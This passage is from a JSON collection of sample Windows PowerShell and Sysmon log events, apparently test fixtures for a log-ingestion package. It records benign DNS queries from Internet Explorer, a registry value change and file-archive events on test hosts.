            "DESKTOP-6RJHI71"
          ],
          "user": [
            "JohnDoe"
          ]
        },
        "user": {
          "domain": "DESKTOP-6RJHI71",
          "id": "S-1-5-21-2882078887-1352635951-3305458046-1000",
          "name": "JohnDoe"
        },
        "winlog": {
          "activity_id": "{a5ce6d2b-8964-4ec4-b0a3-1e749f8aa4ad}",
          "channel": "Microsoft-Windows-PowerShell/Operational",
          "computer_name": "host.contoso.com",
          "event_id": "4103",
          "opcode": "To be used when operation is just executing a method",
          "process": {
            "pid": 2349,
            "thread": {
              "id": 32444
            }
          },
          "provider_guid": "{92a98569-96ac-46a7-af87-1eba79f456ee}",
          "provider_name": "Microsoft-Windows-PowerShell",
          "record_id": "5663677",
          "task": "Executing Pipeline",
          "user": {
            "domain": "DESKTOP-6RJHI71",
            "identifier": "S-1-5-21-2882078887-1352635951-3305458046-1000",
            "name": "JohnDoe",
            "type": "User"
          },
          "version": 1
        }
      }
    },
    {
      "data_stream": "powershell_operational",
      "package": "windows",
      "source": "test/test-events.json-expected.json",
      "sample_event": {
        "@timestamp": "2024-09-03T15:27:45.847Z",
        "ecs": {
          "version": "8.17.0"
        },
        "event": {
          "action": "PowerShell Console Startup",
          "category": [
            "process"
          ],
          "code": "40961",
          "created": "2024-09-05T20:18:14.254Z",
          "kind": "event",
          "provider": "Microsoft-Windows-PowerShell",
          "type": [
            "info"
          ]
        },
        "host": {
          "name": "vagrant"
        },
        "log": {
          "level": "information"
        },
        "message": "PowerShell console is starting up",
        "process": {
          "pid": 2364
        },
        "related": {
          "hosts": [
            "NT AUTHORITY"
          ],
          "user": [
            "SYSTEM"
          ]
        },
        "user": {
          "domain": "NT AUTHORITY",
          "id": "S-1-5-18",
          "name": "SYSTEM"
        },
        "winlog": {
          "activity_id": "{3ee7a05a-f7fc-0006-f0d2-e73efcf7da01}",
          "api": "wineventlog",
          "channel": "Microsoft-Windows-PowerShell/Operational",
          "computer_name": "vagrant",
          "event_id": "40961",
          "opcode": "Start",
          "process": {
            "pid": 2364,
            "thread": {
              "id": 8092
            }
          },
          "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
          "provider_name": "Microsoft-Windows-PowerShell",
          "record_id": "143",
          "task": "PowerShell Console Startup",
          "user": {
            "domain": "NT AUTHORITY",
            "identifier": "S-1-5-18",
            "name": "SYSTEM",
            "type": "Well Known Group"
          },
          "version": 1
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": "22",
          "record_id": 66,
          "computer_name": "vagrant-2016",
          "time_created": "2019-07-18T03:34:02.025Z",
          "level": "information",
          "event_data": {
            "UtcTime": "2019-07-18 03:34:01.239",
            "ProcessGuid": "{fa4a0de6-e8a8-5d2f-0000-001094619900}",
            "ProcessId": "356",
            "QueryName": "go.microsoft.com",
            "QueryStatus": "0",
            "QueryResults": "type:  5 go.microsoft.com.edgekey.net;type:  5 e11290.dspg.akamaiedge.net;::ffff:89.160.20.156;",
            "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
          },
          "provider_name": "Microsoft-Windows-Sysmon",
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "version": 5,
          "user": {
            "identifier": "S-1-5-18"
          },
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          }
        },
        "event": {
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025223900Z'/><EventRecordID>66</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.239</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a8-5d2f-0000-001094619900}</Data><Data Name='ProcessId'>356</Data><Data Name='QueryName'>go.microsoft.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 go.microsoft.com.edgekey.net;type:  5 e11290.dspg.akamaiedge.net;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "provider": "Microsoft-Windows-Sysmon",
          "code": "22",
          "kind": "event"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": "22",
          "record_id": 67,
          "computer_name": "vagrant-2016",
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "version": 5,
          "level": "information",
          "user": {
            "identifier": "S-1-5-18"
          },
          "provider_name": "Microsoft-Windows-Sysmon",
          "time_created": "2019-07-18T03:34:02.025Z",
          "event_data": {
            "QueryName": "www.msn.com",
            "QueryStatus": "0",
            "QueryResults": "type:  5 www-msn-com.a-0003.a-msedge.net;type:  5 a-0003.a-msedge.net;::ffff:89.160.20.156;",
            "Image": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe",
            "UtcTime": "2019-07-18 03:34:01.261",
            "ProcessGuid": "{fa4a0de6-e8a9-5d2f-0000-001053699900}",
            "ProcessId": "2736"
          },
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          }
        },
        "event": {
          "provider": "Microsoft-Windows-Sysmon",
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025237700Z'/><EventRecordID>67</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.261</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a9-5d2f-0000-001053699900}</Data><Data Name='ProcessId'>2736</Data><Data Name='QueryName'>www.msn.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 www-msn-com.a-0003.a-msedge.net;type:  5 a-0003.a-msedge.net;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "code": "22",
          "kind": "event"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "version": 5,
          "level": "information",
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "computer_name": "vagrant-2012-r2",
          "record_id": 612,
          "time_created": "2020-05-07T08:14:44.489Z",
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_data": {
            "RuleName": "-",
            "ProcessId": "2184",
            "User": "VAGRANT-2012-R2\\vagrant",
            "Image": "C:\\Users\\vagrant\\.gvm\\versions\\go1.13.10.windows.amd64\\bin\\go.exe",
            "TargetFilename": "C:\\Users\\vagrant\\AppData\\Local\\Temp\\1\\go-build583768550\\b001\\test.test.exe",
            "Hashes": "MD5=199E1CF5B2250BD515ECCCF4CA686301,IMPHASH=D90D8C7812AEC8DA0FA173AFA1293AB2",
            "Archived": "true",
            "UtcTime": "2020-05-07 08:14:44.489",
            "ProcessGuid": "{42f11c3b-c36f-5eb3-2c07-290000000000}",
            "IsExecutable": "true"
          },
          "process": {
            "pid": 664,
            "thread": {
              "id": 2360
            }
          },
          "event_id": "23",
          "provider_name": "Microsoft-Windows-Sysmon"
        },
        "event": {
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>23</EventID><Version>5</Version><Level>4</Level><Task>23</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-05-07T08:14:44.489978500Z'/><EventRecordID>612</EventRecordID><Correlation/><Execution ProcessID='664' ThreadID='2360'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2012-r2</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-05-07 08:14:44.489</Data><Data Name='ProcessGuid'>{42f11c3b-c36f-5eb3-2c07-290000000000}</Data><Data Name='ProcessId'>2184</Data><Data Name='User'>VAGRANT-2012-R2\\vagrant</Data><Data Name='Image'>C:\\Users\\vagrant\\.gvm\\versions\\go1.13.10.windows.amd64\\bin\\go.exe</Data><Data Name='TargetFilename'>C:\\Users\\vagrant\\AppData\\Local\\Temp\\1\\go-build583768550\\b001\\test.test.exe</Data><Data Name='Hashes'>MD5=199E1CF5B2250BD515ECCCF4CA686301,IMPHASH=D90D8C7812AEC8DA0FA173AFA1293AB2</Data><Data Name='IsExecutable'>true</Data><Data Name='Archived'>true</Data></EventData></Event>",
          "code": "23",
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "event": {
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025262300Z'/><EventRecordID>68</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.449</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a9-5d2f-0000-001053699900}</Data><Data Name='ProcessId'>2736</Data><Data Name='QueryName'>static-global-s-msn-com.akamaized.net</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 a1999.dscg2.akamai.net;::ffff:89.160.20.156;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon",
          "code": "22"
        },
        "winlog": {
          "record_id": 68,
          "opcode": "Info",
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "vagrant-2016",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "version": 5,
          "time_created": "2019-07-18T03:34:02.025Z",
          "level": "information",
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_id": "22",
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          },
          "event_data": {
            "Image": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe",
            "UtcTime": "2019-07-18 03:34:01.449",
            "ProcessGuid": "{fa4a0de6-e8a9-5d2f-0000-001053699900}",
            "ProcessId": "2736",
            "QueryName": "static-global-s-msn-com.akamaized.net",
            "QueryStatus": "0",
            "QueryResults": "type:  5 a1999.dscg2.akamai.net;::ffff:89.160.20.156;::ffff:89.160.20.156;"
          }
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "event_data": {
            "UtcTime": "2019-07-18 03:34:01.457",
            "ProcessGuid": "{fa4a0de6-e8a8-5d2f-0000-001094619900}",
            "ProcessId": "356",
            "QueryName": "www.bing.com",
            "QueryStatus": "0",
            "QueryResults": "type:  5 a-0001.a-afdentry.net.trafficmanager.net;type:  5 dual-a-0001.a-msedge.net;::ffff:89.160.20.156;::ffff:89.160.20.156;",
            "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
          },
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          },
          "record_id": 69,
          "version": 5,
          "level": "information",
          "computer_name": "vagrant-2016",
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "time_created": "2019-07-18T03:34:02.025Z",
          "user": {
            "identifier": "S-1-5-18"
          },
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": "22",
          "provider_name": "Microsoft-Windows-Sysmon"
        },
        "event": {
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon",
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025273600Z'/><EventRecordID>69</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.457</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a8-5d2f-0000-001094619900}</Data><Data Name='ProcessId'>356</Data><Data Name='QueryName'>www.bing.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 a-0001.a-afdentry.net.trafficmanager.net;type:  5 dual-a-0001.a-msedge.net;::ffff:89.160.20.156;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "code": "22"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "provider_name": "Microsoft-Windows-Sysmon",
          "record_id": 2682,
          "computer_name": "vagrant",
          "version": 2,
          "time_created": "2020-05-05T14:57:40.599Z",
          "process": {
            "pid": 5496,
            "thread": {
              "id": 876
            }
          },
          "event_id": "13",
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "level": "information",
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_data": {
            "ProcessId": "6072",
            "Image": "C:\\Windows\\regedit.exe",
            "TargetObject": "HKU\\S-1-5-21-1067164964-2079179834-2367582738-1000\\Software\\Key 1",
            "Details": "DWORD (0x00000004)",
            "RuleName": "-",
            "EventType": "SetValue",
            "UtcTime": "2020-05-05 14:57:40.589",
            "ProcessGuid": "{5b522f6e-77ae-5eb1-2c03-000000000800}"
          },
          "channel": "Microsoft-Windows-Sysmon/Operational"
        },
        "event": {
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-05-05T14:57:40.599567200Z'/><EventRecordID>2682</EventRecordID><Correlation/><Execution ProcessID='5496' ThreadID='876'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2020-05-05 14:57:40.589</Data><Data Name='ProcessGuid'>{5b522f6e-77ae-5eb1-2c03-000000000800}</Data><Data Name='ProcessId'>6072</Data><Data Name='Image'>C:\\Windows\\regedit.exe</Data><Data Name='TargetObject'>HKU\\S-1-5-21-1067164964-2079179834-2367582738-1000\\Software\\Key 1</Data><Data Name='Details'>DWORD (0x00000004)</Data></EventData></Event>",
          "code": "13",
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "provider_name": "Microsoft-Windows-Sysmon",
          "record_id": 11,
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "time_created": "2020-05-07T07:27:18.722Z",
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_data": {
            "Hashes": "SHA1=115106F5B338C87AE6836D50DD890DE3DA296367",
            "Archived": "true",
            "RuleName": "-",
            "ProcessGuid": "{42f11c3b-b2b6-5eb3-18ab-000000000000}",
            "ProcessId": "776",
            "User": "NT AUTHORITY\\LOCAL SERVICE",
            "Image": "C:\\Windows\\System32\\svchost.exe",
            "TargetFilename": "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\lastalive0.dat",
            "UtcTime": "2020-05-07 07:27:18.722",
            "IsExecutable": "false"
          },
          "process": {
            "thread": {
              "id": 2360
            },
            "pid": 664
          },
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "computer_name": "vagrant-2012-r2",
          "opcode": "Info",
          "version": 5,
          "level": "information",
          "event_id": "23"
        },
        "event": {
          "provider": "Microsoft-Windows-Sysmon",
          "code": "23",
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>23</EventID><Version>5</Version><Level>4</Level><Task>23</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-05-07T07:27:18.722136100Z'/><EventRecordID>11</EventRecordID><Correlation/><Execution ProcessID='664' ThreadID='2360'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2012-r2</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-05-07 07:27:18.722</Data><Data Name='ProcessGuid'>{42f11c3b-b2b6-5eb3-18ab-000000000000}</Data><Data Name='ProcessId'>776</Data><Data Name='User'>NT AUTHORITY\\LOCAL SERVICE</Data><Data Name='Image'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='TargetFilename'>C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\lastalive0.dat</Data><Data Name='Hashes'>SHA1=115106F5B338C87AE6836D50DD890DE3DA296367</Data><Data Name='IsExecutable'>false</Data><Data Name='Archived'>true</Data></EventData></Event>",
          "kind": "event"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "winlog": {
          "provider_name": "Microsoft-Windows-Sysmon",
          "record_id": 70,
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "time_created": "2019-07-18T03:34:02.025Z",
          "level": "information",
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          },
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "computer_name": "vagrant-2016",
          "opcode": "Info",
          "version": 5,
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_data": {
            "ProcessId": "2736",
            "QueryName": "linkmaker.itunes.apple.com",
            "QueryStatus": "0",
            "QueryResults": "type:  5 linkmaker.itunes.apple.com.edgekey.net;type:  5 e4541.dsce9.akamaiedge.net;::ffff:89.160.20.156;",
            "Image": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe",
            "UtcTime": "2019-07-18 03:34:01.494",
            "ProcessGuid": "{fa4a0de6-e8a9-5d2f-0000-001053699900}"
          },
          "event_id": "22"
        },
        "event": {
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025284200Z'/><EventRecordID>70</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.494</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a9-5d2f-0000-001053699900}</Data><Data Name='ProcessId'>2736</Data><Data Name='QueryName'>linkmaker.itunes.apple.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 linkmaker.itunes.apple.com.edgekey.net;type:  5 e4541.dsce9.akamaiedge.net;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "code": "22",
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon"
        }
      }
    },
    {
      "data_stream": "sysmon_operational",
      "package": "windows",
      "source": "test/test-events.json",
      "sample_event": {
        "@timestamp": "2021-05-05T15:30:51.692Z",
        "event": {
          "kind": "event",
          "provider": "Microsoft-Windows-Sysmon",
          "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-07-18T03:34:02.025317300Z'/><EventRecordID>71</EventRecordID><Correlation/><Execution ProcessID='2828' ThreadID='1684'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>vagrant-2016</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-07-18 03:34:01.810</Data><Data Name='ProcessGuid'>{fa4a0de6-e8a9-5d2f-0000-001053699900}</Data><Data Name='ProcessId'>2736</Data><Data Name='QueryName'>confiant-integrations.global.ssl.fastly.net</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:89.160.20.156;::ffff:89.160.20.156;::ffff:89.160.20.156;::ffff:89.160.20.156;</Data><Data Name='Image'>C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe</Data></EventData></Event>",
          "code": "22"
        },
        "winlog": {
          "user": {
            "identifier": "S-1-5-18"
          },
          "event_data": {
            "UtcTime": "2019-07-18 03:34:01.810",
            "ProcessGuid": "{fa4a0de6-e8a9-5d2f-0000-001053699900}",
            "ProcessId": "2736",
            "QueryName": "confiant-integrations.global.ssl.fastly.net",
            "QueryStatus": "0",
            "QueryResults": "::ffff:89.160.20.156;::ffff:89.160.20.156;::ffff:89.160.20.156;::ffff:89.160.20.156;",
            "Image": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
          },
          "process": {
            "pid": 2828,
            "thread": {
              "id": 1684
            }
          },
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "provider_name": "Microsoft-Windows-Sysmon",
          "version": 5,
          "opcode": "Info",
          "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "time_created": "2019-07-18T03:34:02.025Z",
          "level": "information",
          "event_id": "22",
          "record_id": 71,
          "computer_name": "vagrant-2016"
        }
      }
    },
